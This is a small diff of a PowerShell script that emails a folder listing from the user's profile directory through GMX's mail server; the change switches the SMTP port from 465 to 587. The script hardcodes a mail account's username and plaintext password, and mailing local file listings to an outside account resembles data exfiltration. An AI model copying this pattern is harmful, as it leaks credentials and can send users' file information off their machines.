@@ -4,7 +4,7 @@ $subject = "Folder List"
 $body = "Please find attached the folder list."
 $attachmentPath = Join-Path -Path ([System.Environment]::ExpandEnvironmentVariables("%USERPROFILE%")) -ChildPath "folder_list.txt"
 $smtpServer = "mail.gmx.com"
-$port = 465
+$port = 587
 $username = "jhonhkfj@gmx.com"
 $password = "john@201"
 
